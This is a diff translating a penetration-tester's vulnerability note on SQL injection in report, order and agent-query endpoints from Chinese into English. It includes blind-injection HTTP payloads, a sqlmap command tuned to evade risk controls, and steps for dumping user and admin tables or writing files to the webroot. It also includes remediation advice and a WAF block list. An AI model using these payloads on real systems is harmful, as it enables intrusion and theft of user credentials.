@@ -1,58 +1,58 @@
 ﻿---
-title: 业务接口 SQL 注入（报表 / 订单 / 代理查询）
-cve: 无（实现缺陷）
+title: SQL injection in business endpoints (reports / orders / agent queries)
+cve: None (implementation flaw)
 severity: critical
 cvss: 9.8
-product: 自研报表与查询接口
-versions: 任意
+product: Custom reporting and query endpoints
+versions: Any
 ports: 80, 443
-keywords: sqli, 注入, orderNo, agentId, 报表, 盲注, union
+keywords: sqli, injection, orderNo, agentId, reports, blind injection, union
 entry: orderNo=1' AND SLEEP(5)--
 verified: false
-sources: 公开资料整理（实现缺陷类，无 CVE）
+sources: Compiled from public sources (implementation flaws; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
-- 报表/导出/列表类接口参数直接拼 SQL：`orderNo`、`agentId`、`date`、`sort`、`order`。
-- 报错页含 `SQL syntax`、`MySQL`、`ORA-`、`ODBC`。
+- Report/export/list endpoint parameters are concatenated directly into SQL: `orderNo`, `agentId`, `date`, `sort`, `order`.
+- Error pages contain `SQL syntax`, `MySQL`, `ORA-`, `ODBC`.
 
-## 前置条件
+## Prerequisites
 
-- 有账号（部分报表要代理或后台权限，很多站前台订单查询也拼接）。
-- 授权测试，避免 `SLEEP` 把生产打满。
+- An account (some reports require agent or admin privileges; many sites also concatenate SQL in frontend order queries).
+- Authorized testing; avoid saturating production with `SLEEP`.
 
 ## PoC
 
 ```http
-### 时间盲注
+### Time-based blind injection
 GET /api/order/query?orderNo=20241105001'%20AND%20SLEEP(5)--%20- HTTP/1.1
 Authorization: Bearer <token>
 
-### 布尔盲注
+### Boolean-based blind injection
 GET /api/report/bet?agentId=1'%20AND%201=1--%20- HTTP/1.1
 GET /api/report/bet?agentId=1'%20AND%201=2--%20- HTTP/1.1
 ```
 
 ```bash
-# sqlmap 指定目标参数（低并发，避免触发风控）
+# Specify the target parameter in sqlmap (low concurrency to avoid triggering risk controls)
 sqlmap -r req.txt -p orderNo --batch --level 2 --risk 2 --threads 2 --dbms mysql
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先做单引号探测（报错/500/延迟差异），确认注入点。
-2. 用时间盲注确认（`SLEEP(3)` 对比），再 `UNION SELECT version(),database()`。
-3. 读关键表：`member`（手机号/密码哈希）、`order`、`withdraw`、`admin_user`。
-4. 有 `FILE` 权限时 `INTO OUTFILE` 写 webroot；无则走 UDF 或仅数据读取。
-5. 证据：延迟对比两条 + `version()` 回显；报告只列表名与字段，别导数据。
+1. Start with a single-quote probe (errors/500/delay differences) to identify the injection point.
+2. Confirm with time-based blind injection (compare `SLEEP(3)`), then `UNION SELECT version(),database()`.
+3. Read key tables: `member` (phone numbers/password hashes), `order`, `withdraw`, `admin_user`.
+4. With `FILE` privileges, use `INTO OUTFILE` to write to webroot; otherwise use UDF or limit access to reading data.
+5. Evidence: two delay comparisons + `version()` output; list only table names and fields in the report, without exporting data.
 
-## 修复与缓解（加固）
+## Remediation and Mitigation (Hardening)
 
-- 全量参数化查询（预编译）；禁止字符串拼 SQL。
-- DB 账号最小权限（禁 `FILE`、禁跨库）；错误页统一（不回显 SQL）。
-- WAF 拦 `SLEEP(`、`UNION SELECT`、`--` 组合；查询接口加限速。
+- Use parameterized queries throughout (prepared statements); prohibit string-concatenated SQL.
+- Least-privilege DB accounts (no `FILE`, no cross-database access); consistent error pages (no SQL output).
+- Block combinations of `SLEEP(`, `UNION SELECT`, `--` at the WAF; rate-limit query endpoints.
 
-## 参考
+## References
 
-- OWASP WSTG-INPV-05；sqlmap 文档。
+- OWASP WSTG-INPV-05; sqlmap documentation.
